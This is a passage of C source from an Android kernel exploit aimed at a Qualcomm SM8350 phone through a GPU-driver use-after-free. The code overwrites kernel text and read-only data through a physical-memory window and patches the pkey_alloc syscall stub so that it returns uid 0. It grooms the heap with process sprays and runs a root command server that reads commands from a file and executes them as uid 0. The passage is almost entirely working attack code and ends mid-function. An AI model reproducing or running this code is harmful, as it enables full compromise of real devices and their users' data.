                                    irqs = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                    for (int i = 0; i < 4; i++) mb[i] = 0;
                                    syscall(nrrd, mb, (void *)(tcs_base + 0x14), (size_t)4);
                                    ctl0 = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                    for (int i = 0; i < 4; i++) mb[i] = 0;
                                    syscall(nrrd, mb, (void *)(tcs_base + 0x14 + 672), (size_t)4);
                                    ctl1 = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                    for (int i = 0; i < 4; i++) mb[i] = 0;
                                    syscall(nrrd, mb, (void *)(drv + 0x148), (size_t)4);
                                    use = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                    en0 = st0 = en1 = st1 = 0;
                                }
                                int on = 0;
                                on += hx32(ob + on, (uint32_t)it); ob[on++] = ' ';
                                on += hx32(ob + on, irqs); ob[on++] = ' ';
                                on += hx32(ob + on, use);  ob[on++] = ' ';
                                on += hx32(ob + on, ctl0); ob[on++] = ' ';
                                on += hx32(ob + on, en0);  ob[on++] = ' ';
                                on += hx32(ob + on, st0);  ob[on++] = ' ';
                                on += hx32(ob + on, ctl1); ob[on++] = ' ';
                                on += hx32(ob + on, en1);  ob[on++] = ' ';
                                on += hx32(ob + on, st1);  ob[on++] = '\n';
                                if (fd >= 0) { ssize_t wr = write(fd, ob, on); (void)wr; safe_fsync(fd); }
                                struct timespec q2 = { 1, 0 };
                                nanosleep(&q2, NULL);
                            }
                            if (fd >= 0) close(fd);
                            {
                                volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                for (int i = 0; i < 4; i++) sw[i] = saved[i];
                                cache_maint_el0((void *)sw, 16); l1i_capacity_evict();
                            }
                            { const char *e2 = "[RSCRN] done\n"; syscall(SYS_write, 1, e2, 13); }
                        } else {
                            const char *e2 = "[RSCRN] rejected (stub/drv)\n";
                            syscall(SYS_write, 1, e2, 28);
                        }
                        log_fsync();
                    }
                    if (strstr(pb, "DRAMLOOP")) {
                        /* DRAMLOOP <tbl> <nr_read> <ctu> <rsc_drv_va> <sec>
                        Control for the MMIO sampler: same cadence, same fsync per record, but every read
                        is DRAM (rsc_drv and the IPC log are heap objects), which separates loop and fsync
                        cost from MMIO traffic. */
                        char *q = strstr(pb, "DRAMLOOP") + 8;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nrrd = (int)strtoul(q, &q, 10);
                        uint64_t ctu = strtoull(q, &q, 16);
                        uint64_t rsc_drv_va = strtoull(q, &q, 16);
                        int secs = atoi(q);
                        if (secs < 20 || secs > 600) secs = 120;
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        uint64_t stub = 0, sp = 0; uint32_t saved[4];
                        {
                            uint64_t ent_pa = (tbl + (uint64_t)nrrd * 8 - g_delta)
                                              - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                                volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                                stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                            }
                            if (stub && ctu) {
                                sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                                int64_t d = (int64_t)ctu - (int64_t)(stub + 12);
                                if (sp >= LO && sp + 16 <= HI && d >= -134217728LL && d <= 134217724LL) {
                                    volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                    for (int i = 0; i < 4; i++) saved[i] = sw[i];
                                    uint32_t w[4];
                                    w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                                    w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                                    for (int i = 0; i < 4; i++) sw[i] = w[i];
                                    cache_maint_el0((void *)sw, 16); l1i_capacity_evict();
                                } else stub = 0;
                            } else stub = 0;
                        }
                        uint64_t drv = 0;
                        {
                            uint64_t dp = (rsc_drv_va - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && dp >= LO && dp + 8 <= HI) {
                                volatile uint32_t *dpw = (volatile uint32_t *)(void *)(g_lb + (dp - LO));
                                drv = (uint64_t)dpw[0] | ((uint64_t)dpw[1] << 32);
                            }
                        }
                        if (stub && drv) {
                            static uint8_t mb[64];
                            int fd = open("/data/local/tmp/dram.log", O_WRONLY | O_CREAT | O_TRUNC, 0666);
                            char ob[256];
                            const char *hdr = "it tcs_in_use slots0 slots1 slots2 slots3 dirty wpage woff\n";
                            if (fd >= 0) { ssize_t wr = write(fd, hdr, strlen(hdr)); (void)wr; safe_fsync(fd); }
                            for (int it = 0; it < secs; it++) {
                                uint32_t v[8] = { 0 };
                                int on = 0;
                                /* v0 = tcs_in_use (drv+0x148) */
                                for (int m2 = 0; m2 < 4; m2++) mb[m2] = 0;
                                syscall(nrrd, mb, (void *)(drv + 0x148), (size_t)4);
                                v[0] = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                /* v1..v4 = tcs[0..3].slots (drv+0x68 + 0x48*i) */
                                for (int k = 0; k < 4; k++) {
                                    for (int m2 = 0; m2 < 4; m2++) mb[m2] = 0;
                                    syscall(nrrd, mb, (void *)(drv + 0x68 + (uint64_t)k * 0x48), (size_t)4);
                                    v[1 + k] = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                }
                                /* v5 = client.dirty (drv+0x158+0x14) */
                                for (int m2 = 0; m2 < 4; m2++) mb[m2] = 0;
                                syscall(nrrd, mb, (void *)(drv + 0x158 + 0x14), (size_t)4);
                                v[5] = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                /* v6 = low half of the IPC log's write_page pointer (drv+0x190 -> ctx+0x68) */
                                uint64_t ctx = 0, wp = 0;
                                for (int m2 = 0; m2 < 8; m2++) mb[m2] = 0;
                                syscall(nrrd, mb, (void *)(drv + 0x190), (size_t)8);
                                for (int m2 = 0; m2 < 8; m2++) ctx |= (uint64_t)mb[m2] << (8 * m2);
                                if (ctx) {
                                    for (int m2 = 0; m2 < 8; m2++) mb[m2] = 0;
                                    syscall(nrrd, mb, (void *)(ctx + 0x68), (size_t)8);
                                    for (int m2 = 0; m2 < 8; m2++) wp |= (uint64_t)mb[m2] << (8 * m2);
                                }
                                /* v7 = write_offset, the u16 at page+0x0E */
                                if (wp) {
                                    for (int m2 = 0; m2 < 4; m2++) mb[m2] = 0;
                                    syscall(nrrd, mb, (void *)(wp + 0x0C), (size_t)4);
                                    v[7] = (uint32_t)mb[2] | ((uint32_t)mb[3] << 8);
                                }
                                v[6] = (uint32_t)(wp & 0xFFFFFFFFu);
                                on += hx32(ob + on, (uint32_t)it); ob[on++] = ' ';
                                for (int j = 0; j < 8; j++) { on += hx32(ob + on, v[j]); ob[on++] = ' '; }
                                ob[on++] = '\n';
                                if (fd >= 0) { ssize_t wr = write(fd, ob, on); (void)wr; safe_fsync(fd); }
                                struct timespec q2 = { 1, 0 };
                                nanosleep(&q2, NULL);
                            }
                            if (fd >= 0) close(fd);
                            {
                                volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                for (int i = 0; i < 4; i++) sw[i] = saved[i];
                                cache_maint_el0((void *)sw, 16); l1i_capacity_evict();
                            }
                            { const char *e2 = "[DRAMLOOP] done\n"; syscall(SYS_write, 1, e2, 17); }
                        } else {
                            const char *e2 = "[DRAMLOOP] rejected\n";
                            syscall(SYS_write, 1, e2, 20);
                        }
                        log_fsync();
                    }
                    if (strstr(pb, "KCPATCH")) {
                        /* KCPATCH <va_hex> <w0_hex> [<w1_hex>] [<w2_hex>]
                        Overwrites kernel text at VA; PA = (VA - g_delta) - 0xffffffc010000000 + 0xa0000000.
                        Main thread only: it owns the window, and the server would fault without it.
                        Meant to neutralize SMMU teardown, e.g. arm_smmu_tlb_inv_context_s1 -> ret or
                        __arm_smmu_tlb_sync -> mov w0,#0; ret. */
                        char *q = strstr(pb, "KCPATCH") + 7;
                        uint64_t va = strtoull(q, &q, 16);
                        uint32_t ws[4]; int nw = 0;
                        while (nw < 4) {
                            while (*q == ' ' || *q == '\t') q++;
                            if (*q == 0 || *q == '\n' || *q == '\r') break;
                            ws[nw++] = (uint32_t)strtoull(q, &q, 16);
                        }
                        uint64_t pa = (va - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                        char ob[192]; int on = 0;
                        const char *pre = "[PAUSE] KCPATCH va=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(va >> 32));
                        on += hx32(ob + on, (uint32_t)va);
                        pre = " pa=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(pa >> 32));
                        on += hx32(ob + on, (uint32_t)pa);
                        if (nw > 0 && g_lb && g_delta &&
                            pa >= 0x80000000ULL && pa + 16 <= 0x80000000ULL + 0xC0000000ULL) {
                            volatile uint32_t *p = (volatile uint32_t *)(void *)(g_lb + (pa - 0x80000000ULL));
                            pre = " before=";
                            while (*pre) ob[on++] = *pre++;
                            for (int i = 0; i < nw; i++) { on += hx32(ob + on, p[i]); ob[on++] = ' '; }
                            for (int i = 0; i < nw; i++) p[i] = ws[i];
                            cache_maint_el0((void *)p, nw * 4);
                            l1i_capacity_evict();
                            pre = " after=";
                            while (*pre) ob[on++] = *pre++;
                            for (int i = 0; i < nw; i++) { on += hx32(ob + on, p[i]); ob[on++] = ' '; }
                            pre = (p[0] == ws[0]) ? "(landed)\n" : "(FAIL)\n";
                            while (*pre) ob[on++] = *pre++;
                        } else {
                            pre = " (rejected)\n";
                            while (*pre) ob[on++] = *pre++;
                        }
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                }
            }
        }
        /* The server runs as uid 0 in the kernel context, where adb shell cannot see it,
        * and a zombie it leaves behind unwaited is equally invisible. It can also block
        * forever in wait4/pread64/write, none of which time out, so main is the only role
        * that can watch it from inside. Print on state change only. */
        if (g_srv_pid > 0) {
            static char sproc[24] = "/proc/";
            static char sdig[12];
            int dw = 0, alive;
            { long x = (long)g_srv_pid;
              if (x == 0) sdig[dw++] = '0';
              while (x > 0 && dw < 11) { sdig[dw++] = (char)('0' + x % 10); x /= 10; }
            }
            { int i = 6; sdig[dw] = 0;
              while (dw > 0) sproc[i++] = sdig[--dw];
              sproc[i] = 0;
            }
            /* aarch64 has no access(2); faccessat is nr 48. */
            alive = (faccessat(AT_FDCWD, sproc, F_OK, 0) == 0);
            if (alive != g_srv_alive_last) {
                g_srv_alive_last = alive;
                L("[SRV] pid=%d %s\n", (int)g_srv_pid,
                  alive ? "server alive (/proc present)"
                        : "server GONE (/proc gone = exited or zombie)");
                log_fsync();
            }
        }
        struct timespec pz = { 2, 0 };
        nanosleep(&pz, NULL);
    }
}

/* Signal handler: pause instead of exiting, so a kill during teardown cannot crash. */
static void uaf_pause_h(int sig)
{
    /* Probe: which signal stopped the main thread in ppoll. Raw write to fd1, no stdio. */
    {
        char sb[64]; int sn = 0;
        const char H[] = "[pause-h sig=";
        for (const char *q = H; *q; q++) sb[sn++] = *q;
        sb[sn++] = '0' + (char)sig;
        sb[sn++] = ']'; sb[sn++] = '\n';
        syscall(SYS_write, 1, sb, (long)sn);
    }
    (void)sig;
    uaf_pause();
}

/* Two recurring battery windows coincide with SMMU/SPMI faults and hang the target:
battery_saf at 35.8 + 61.4k and asus_long_full_cap at 4.5 + 30.72k, each +/-1.5s.
Work also starts ~60s after boot, to avoid racing allocator and shrinker init. */
static void wait_boot_settle(void)
{
    FILE *f = fopen("/proc/uptime", "r");
    double up = 0.0;
    if (f) { fscanf(f, "%lf", &up); fclose(f); }
    if (up < 60.0) {
        unsigned int sec = (unsigned int)(60.0 - up);
        L("[*] boot settle: uptime=%.1fs, waiting %us\n", up, sec);
        sleep(sec);
    }
}

static int in_battery_window(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    long long up = (long long)ts.tv_sec;
    /* battery_saf: 35.8 + 61.4k, +/- 1.5s */
    if (up >= 34) {
        long long off = (up - 35) % 61;
        if (off < 4) return 1;
    }
    /* asus_long_full_cap: 4.5 + 30.72k, +/- 1.5s; rounded to a 31s period */
    long long off2 = up % 31;
    if (off2 >= 3 && off2 <= 6) return 1;
    return 0;
}

/* Wait out the battery windows without submitting any work. */
static void wait_clean_band(void)
{
    int waited = 0;
    while (in_battery_window()) {
        usleep(100 * 1000);
        waited = 1;
    }
    if (waited) L("[*] waited out the window; entering the clean band\n");
}

/* Wait until the next window is more than 10s away: the work that follows takes
~5-10s and has to fit inside the band. */
static void wait_long_clean_band(void)
{
    int waited = 0;
    for (;;) {
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        long long up = (long long)ts.tv_sec;
        long long next = 1LL << 60;
        /* battery_saf window: [35+61k, 38+61k) -- next start */
        long long off = (up - 35) % 61;
        long long n1 = up - off + 61;   /* next battery_saf start */
        /* asus: 3 + 31k .. 6 + 31k */
        long long off2 = up % 31;
        long long n2 = up - off2 + 31 + 3;
        long long best = n1 < n2 ? n1 : n2;
        long long dt = best - up;
        if (dt > 10) break;
        usleep(100 * 1000);
        waited = 1;
    }
    if (waited) L("[*] waited for a long clean band (next window >10s)\n");
    log_fsync();
}


/* Command child (CLONE_VM): polls for uid 0 after the cred overwrite, then writes proof
and execs a shell. The shared mm means exec and exit run no teardown, so the root shell
survives. TPIDR_EL0 is 0 in a raw clone child, so every syscall here is raw. */
static void __attribute__((noreturn)) root_fifo_server(void);
static int p5_child_main(void *arg)
{
    (void)arg;
    syscall(SYS_prctl, PR_SET_NAME, (unsigned long)"Z33107X", 0, 0, 0);
    for (int t = 0; t < 600; t++) {
        long uid = syscall(SYS_getuid);
        if (uid == 0) {
            static const char msg[] = "[+] ROOTED child uid=0 - exec sh\n";
            syscall(SYS_write, 1, msg, sizeof(msg) - 1);
            int pf = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/root_proof.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (pf >= 0) {
                static const char proof[] = "ROOTED pid=";
                syscall(SYS_write, pf, proof, sizeof(proof) - 1);
                char pidbuf[16];
                long pid = syscall(SYS_getpid);
                int pl = 0;
                if (pid == 0) pidbuf[pl++] = '0';
                else { char tmp[16]; int ti = 0; while (pid) { tmp[ti++] = '0' + (pid % 10); pid /= 10; } while (ti) pidbuf[pl++] = tmp[--ti]; }
                syscall(SYS_write, pf, pidbuf, pl);
                static const char proof2[] = " uid=0\n";
                syscall(SYS_write, pf, proof2, sizeof(proof2) - 1);
                syscall(SYS_close, pf);
            }
            root_fifo_server();   /* Single instance comes from the pidfile, not from flock: a
            cloned child inherits the open descriptor and would hold any flock
            forever. */
            syscall(SYS_exit_group, 1);
        }
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 500 * 1000 * 1000 };
        syscall(SYS_nanosleep, &ts, NULL);
    }
    syscall(SYS_exit_group, 0);
    return 0;
}


/* Burn children exist to place their task_struct and cred inside the UNMOVABLE window
the scan walks. Two allocator properties get them there: a fork that finds no page of
the requested order falls back to stealing the largest block, and children are appended
to the tail of the tasks list, so one burst ends up adjacent. They are named burnNN,
the signature the scan looks for. */
#define BURN_MAX       320   /* holds a full retry wave; 384 caused OOM */
#define BURN_WAVE_A    96    /* fallback wave; 384 caused OOM under pressure */
#define BURN_WAVE_B    64
#define BURN_WAVE_C    96    /* after the cred burst: grows new slab pages */
#define BURN_WAVE_R    64    /* after wave C: 64 more order-3 buddy blocks */

static int   burn_cmdw[BURN_MAX];   /* write end of the parent-to-child wake pipe */
static int   burn_rspr[BURN_MAX];   /* read end of the child-to-parent report pipe */
static int   n_burn = 0;
/* Root command channel. `sh -i` under nohup with stdin from /dev/null dies on the non-tty
stdin, so a resident loop watches /data/local/tmp/rootcmd and runs each line as uid 0,
appending output to /data/local/tmp/rootout.
Every syscall below is inline asm: TPIDR_EL0 is 0 here, so glibc's syscall() would fault
writing errno through TLS on any failure path. */
#define RSC_dup3          24
#define SYS_flock         32
#define SYS_mknodat       33
#define SYS_openat        56
#define SYS_close         57
#define SYS_read          63
#define SYS_write         64
#define SYS_ppoll         73
#define RSC_exit_group    94
#define SYS_nanosleep    101
#define RSC_clock_gettime 113
#define SYS_getpid       172
#define SYS_clone        220
#define SYS_execve       221
#define SYS_lseek         62
#define RSC_pread64       67
#define SYS_readlink      63
#define SYS_fstat         80
#define RSC_wait4        260

static inline long rsys(long n, long a1, long a2, long a3,
                        long a4, long a5, long a6)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a1;
    register long x1 __asm__("x1") = a2;
    register long x2 __asm__("x2") = a3;
    register long x3 __asm__("x3") = a4;
    register long x4 __asm__("x4") = a5;
    register long x5 __asm__("x5") = a6;
    __asm__ volatile ("svc #0"
                      : "+r"(x0)
                      : "r"(x8), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
                      : "memory");
    return x0;
}
#define rs1(n,a)       rsys((n),(long)(a),0,0,0,0,0)
#define rs2(n,a,b)     rsys((n),(long)(a),(long)(b),0,0,0,0)
#define rs3(n,a,b,c)   rsys((n),(long)(a),(long)(b),(long)(c),0,0,0)
#define rs4(n,a,b,c,d) rsys((n),(long)(a),(long)(b),(long)(c),(long)(d),0,0)

static void rput(int fd, const char *s, long len)
{
    while (len > 0) {
        long w = rs3(SYS_write, fd, (long)s, len);
        if (w <= 0) { if (w == -4) continue; break; }
        s += w; len -= w;
    }
}
static void rputs(int fd, const char *s)
{ long n = 0; while (s[n]) n++; rput(fd, s, n); }
static void rdec(int fd, unsigned long v)
{
    char t[24], o[24]; int i = 0, j = 0;
    if (!v) { rput(fd, "0", 1); return; }
    while (v) { t[i++] = '0' + (char)(v % 10UL); v /= 10UL; }
    while (i) o[j++] = t[--i];
    rput(fd, o, j);
}

#define FIFO_PATH "/data/local/tmp/rootcmd"
#define OUT_PATH  "/data/local/tmp/rootout"
#define CMD_PATH  "/data/local/tmp/rootcmd"
#define LOCK_PATH "/data/local/tmp/.rootcmd.lock"
#define LINE_MAXC 2048
/* Jump frames and window state shared with the RESTORE_STUB command. */
static sigjmp_buf jmpbuf;
static sigjmp_buf jmpbuf2;   /* separate frame for window reads */
static sigjmp_buf jmpbuf3;
static volatile sig_atomic_t jmp3_armed = 0;
static volatile sig_atomic_t jmp2_armed = 0;
static volatile sig_atomic_t jmp_armed = 0;
static volatile sig_atomic_t *g_pkey_call_inflight_p = 0;   /* stub window pointer */
static volatile int sweep_quiet = 0;   /* set by the segv handler; silences logging during a scan */
static volatile uint8_t *g_lb = 0;              /* linear-mapping window base */
static uint64_t g_img_pa = 0;                   /* image physical address, recovered by SLIDETEST */
#define g_pkey_call_inflight (*g_pkey_call_inflight_p)
static int g_main_tid = -1;   /* main thread tid; the watchdog reads this thread's status */
static volatile uint64_t *g_thrash_buf = 0;   /* target for capacity eviction */
static uint64_t g_thrash_sum = 0;
static volatile uint32_t *g_pkey_stub = 0;   /* window pointer to the patched pkey_alloc stub, used to restore it */
static uint64_t g_M = 0;            /* copy of the M value recovered early */
static uint64_t g_kvo = 0;          /* kimage_voffset, read out early */
static uint64_t g_pool_ops_rt = 0;  /* runtime pool_ops VA, confirmed on device */
/* Read by the fork server; these must be static, because static
   storage survives the clone. */
static uint32_t *g_rel_hit_ids; static int *g_rel_hit_pages; static int *g_rel_hit_slots;
static volatile int g_rel_nh = 0, g_rel_nsprayed = 0;
static uint64_t g_rel_victim_ep = 0; static uint32_t g_rel_victim_id = 0;
static uint32_t *g_rel_spray_ids;
static uint32_t g_place_id = 0;     /* PLACE id from trigger_dangling, needed to release the frame */
static uint32_t g_forge_id = 0;     /* gpuobj id of the forged page */
static uint32_t g_fids[4]; static volatile uint64_t *g_fus[4];
static uint64_t g_fs1[4], g_fs2[4];   /* one sentinel pair per page */
static int g_nfpre = 0;
static volatile uint8_t *g_forge_u = 0;  /* CPU alias of the forged page */

/* EL0 cache maintenance, as bionic's __clear_cache does: dc civac pushes
   dirty lines out of L1D, ic ivau drops stale lines from every core's L1I.
   L1I does not snoop L1D, so without this another core can run stale code. */
static inline void cache_maint_el0(volatile void *p, int bytes);
static inline void cache_maint_el0(volatile void *p, int bytes)
{
    uintptr_t a = (uintptr_t)p & ~63UL;
    uintptr_t e = ((uintptr_t)p + bytes + 63) & ~63UL;
    for (; a < e; a += 64) {
        asm volatile("dc civac, %0" :: "r"(a));
        asm volatile("ic ivau, %0" :: "r"(a));
    }
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");
}

/* Address-independent L1I invalidation: under a device-typed window
   mapping ic ivau is a no-op, while ic ialluis takes no VA operand and is
   unaffected by memory type. */

/* Capacity eviction of this core's unified L1D+L2: a 16 MiB sequential read
   at stride 64B exceeds any SM8350 core's L2, so the target code line is
   evicted and the next ifetch misses down to memory, which returns the code
   the store already delivered. This path exists because ic ivau is
   UNPREDICTABLE on a Device-typed alias. */
static volatile uint32_t *g_sled = 0;   /* L1I capacity-eviction sled */
static void l1i_capacity_evict(void)
{
    if (!g_thrash_buf) return;   /* preallocated before the spray: a demand-page allocation here hangs */
    uint64_t s = 0;
    /* The write pass fills L1D with dirty lines; the reverse read
    defeats the evict-first streaming policy */
    for (int i = 0; i < (16 << 20) / 64; i += 1) g_thrash_buf[i * 8] = (uint64_t)i;
    for (int i = (16 << 20) / 64 - 1; i >= 0; i -= 1) s += g_thrash_buf[i * 8];
    g_thrash_sum += s;
    /* L1I is a separate cache, so data reads cannot evict it: execute a 256 KB
       sled of RET instructions instead, stride 64B so every line is fetched.
       Device-window writes do not snoop the I-cache, so a line the ART GC ran
       earlier is still cached as the old code. */
    if (g_sled) {
        typedef void (*retfn)(void);
        retfn fns[4096]; int nf = 0;
        for (int i = 0; i < (256 << 10) / 4 && nf < 4096; i += 16, nf++)
            fns[nf] = (retfn)((volatile void *)(g_sled + i));
        for (int k = 0; k < nf; k++) fns[k]();
    }
}

/* Release command dispatch. */
static void rel_handle(const char *line);
static int g_heal_hits_done = 0, g_heal_victim_done = 0;
static int gf_read_u64s(const char *path, uint64_t *out, int maxn)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[8192]; int ln = 0, n = 0;
    for (;;) {
        ssize_t r = read(fd, buf + ln, sizeof(buf) - ln - 1);
        if (r <= 0) break;
        ln += (int)r; buf[ln] = 0;
        char *nl;
        for (;;) {
            nl = strchr(buf, '\n');
            if (!nl) break;
            *nl = 0;
            if (n < maxn) out[n++] = strtoull(buf, 0, 0);
            int rest = ln - (int)(nl - buf) - 1;
            memmove(buf, nl + 1, rest); ln = rest; buf[ln] = 0;
        }
        if (ln >= (int)sizeof(buf) - 1) break;
    }
    if (ln > 0 && n < maxn) out[n++] = strtoull(buf, 0, 0);
    close(fd);
    return n;
}
static uint32_t g_pkey_stub_backup[8];          /* original stub words, for RESTORE_STUB */

/* The patched pkey_alloc stub answers uid 0 to any process that can call
   syscall 289, so it must not outlive the run. Called by the poller and by the
   fast path as soon as root is confirmed. Returns 1 when there was state to put
   back. */
static int restore_pkey_stub_now(void)
{
    static const char RSD[] = "[PAUSE] RESTORE_STUB done\n";
    static const char RSN[] = "[PAUSE] RESTORE_STUB no-state\n";
    if (!(g_pkey_stub && g_pkey_payload_nwords > 0)) {
        syscall(SYS_write, 1, RSN, sizeof(RSN) - 1);
        return 0;
    }
    for (int k2 = 0; k2 < g_pkey_payload_nwords; k2++)
        g_pkey_stub[k2] = g_pkey_stub_backup[k2];
    /* ic ialluis needs EL1 even under this window and traps, taking the process
       down with an unhealed teardown. cache_maint_el0() plus l1i_capacity_evict()
       is the EL0-safe form. */
    cache_maint_el0((void *)g_pkey_stub, g_pkey_payload_nwords * 4);
    l1i_capacity_evict();
    l1i_capacity_evict();
    l1i_capacity_evict();
    /* Readback through the window, to show the restore landed. Only the first
       word is printed; w1 and w2 are not checked. */
    char rdb[48]; int rn = 0;
    const char *pre = "[PAUSE] RESTORE_STUB rb=";
    while (*pre) rdb[rn++] = *pre++;
    uint32_t w0r = g_pkey_stub[0];
    for (int sh = 28; sh >= 0; sh -= 4) {
        int dg = (int)((w0r >> sh) & 0xf);
        rdb[rn++] = (char)(dg < 10 ? '0' + dg : 'a' + dg - 10);
    }
    rdb[rn++] = '\n';
    syscall(SYS_write, 1, rdb, rn);
    syscall(SYS_write, 1, RSD, sizeof(RSD) - 1);
    return 1;
}
static int g_pkey_payload_nwords = 0;                /* payload length in words */
static void fifo_run_line(char *line, long len)
{
    /* RESTORE_STUB: write the original pkey_alloc stub back. The window mapping
       is shared with main under CLONE_VM, so g_pkey_stub can be dereferenced
       directly; the command runs in the server's root context. */
    /* Release commands: the server holds its own kgsl fd and every step
       goes through the ioctl/submit path, so the forked child can run them
       even though the lb window mapping is not inherited (VM_DONTCOPY). */
    if (line[0] == 'R' && !strncmp(line, "RELEASE_", 8)) {
        rel_handle(line);
        return;
    }
    if (line[0] == 'R' && !strncmp(line, "RESTORE_STUB", 12)) {
        /* Routed elsewhere: the PKEY_HIJACK_ONLY server has no window mapping (lb is
           VM_DONTCOPY), so writing through it would kill the server. main's
           uaf_pause poller issues the command instead. */
        if (getenv("PKEY_HIJACK_ONLY"))
            { rputs(1, "[RESTORE_STUB] routed: echo RESTORE_STUB > /data/local/tmp/wdcmd\n"); return; }
        if (g_pkey_stub && g_pkey_payload_nwords > 0) {
            if (sigsetjmp(jmpbuf, 1) == 0) {
                jmp_armed = 1;
                g_pkey_stub[0] = g_pkey_stub_backup[0];
                g_pkey_stub[1] = g_pkey_stub_backup[1];
                for (int k2 = 2; k2 < g_pkey_payload_nwords; k2++)
                    g_pkey_stub[k2] = g_pkey_stub_backup[k2];
                cache_maint_el0((void *)g_pkey_stub, (g_pkey_payload_nwords > 0 ? g_pkey_payload_nwords : 2) * 4);   /* the restored words must leave the I-cache as well */
                uint32_t c0 = g_pkey_stub[0];
                uint32_t c1 = g_pkey_stub[1];
                jmp_armed = 0;
                {
                    static const char OKM[] =
                        "[RESTORE_STUB] done: stub restored\n";
                    syscall(SYS_write, 1, OKM, sizeof(OKM) - 1);
                }
                log_fsync();
            } else { jmp_armed = 0; }
        }
        return;
    }
    /* RO_FLUSH: zero rodata_enabled/rodata_full through the phys window so
       module_enable_ro() early-returns and set_memory_ro is skipped.
       rodata_enabled sits at file offset 0x2204090, so PA = image_pa + that. */
    if (line[0] == 'R' && !strncmp(line, "RO_FLUSH", 8)) {
        if (g_lb && g_img_pa) {
            if (sigsetjmp(jmpbuf, 1) == 0) {
                jmp_armed = 1;
                volatile uint8_t *re_p = (volatile uint8_t *)(g_lb + (g_img_pa + 0x2204090ULL - 0x80000000ULL));
                volatile uint8_t *rf_p = (volatile uint8_t *)(g_lb + (g_img_pa + 0x22044b8ULL - 0x80000000ULL));
                *re_p = 0x00;
                *rf_p = 0x00;
                uint8_t re_rb = *re_p;
                uint8_t rf_rb = *rf_p;
                jmp_armed = 0;
                {
                    char okm[96]; int on = 0;
                    const char OM[] = "[RO_FLUSH] re=";
                    for (const char *q = OM; *q; q++) okm[on++] = *q;
                    okm[on++] = '0' + (char)(re_rb ? 1 : 0);
                    const char OM2[] = " rf=";
                    for (const char *q = OM2; *q; q++) okm[on++] = *q;
                    okm[on++] = '0' + (char)(rf_rb ? 1 : 0);
                    okm[on++] = '\n';
                    syscall(SYS_write, 1, okm, (long)on);
                }
                log_fsync();
            } else { jmp_armed = 0; }
        }
        return;
    }
    /* WR <hex file offset> <hex 8 bytes>: write 8 bytes through the phys
       window at PA = image_pa + off. */
    if (line[0] == 'W' && line[1] == 'R' && line[2] == ' ') {
        if (g_lb && g_img_pa) {
            unsigned long va = 0; unsigned long long val = 0;
            const char *q = line + 3;
            while (*q == ' ') q++;
            while ((*q >= '0' && *q <= '9') || (*q >= 'a' && *q <= 'f') || (*q >= 'A' && *q <= 'F')) {
                int c = (*q >= '0' && *q <= '9') ? (*q - '0') : ((*q | 32) - 'a' + 10);
                va = va * 16 + c; q++;
            }
            while (*q == ' ') q++;
            while ((*q >= '0' && *q <= '9') || (*q >= 'a' && *q <= 'f') || (*q >= 'A' && *q <= 'F')) {
                int c = (*q >= '0' && *q <= '9') ? (*q - '0') : ((*q | 32) - 'a' + 10);
                val = val * 16 + c; q++;
            }
            /* only valid inside the directly mapped text/rodata/data region */
            if (va < 0x40000000ULL && val) {
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    unsigned long long pa = g_img_pa + va;
                    volatile unsigned long long *wp = (volatile unsigned long long *)(g_lb + (pa - 0x80000000ULL));
                    unsigned long long old = *wp;
                    *wp = val;
                    unsigned long long rb = *wp;
                    jmp_armed = 0;
                    {
                        char okm[128]; int on = 0;
                        const char *OM = "[WR] old=0x";
                        for (const char *p2 = OM; *p2; p2++) okm[on++] = *p2;
                        for (int sh = 60; sh >= 0; sh -= 4) { int d = (int)((old >> sh) & 0xf); okm[on++] = (char)((d < 10 ? '0' + d : 'a' + d - 10)); }
                        const char *OM2 = " new=0x";
                        for (const char *p2 = OM2; *p2; p2++) okm[on++] = *p2;
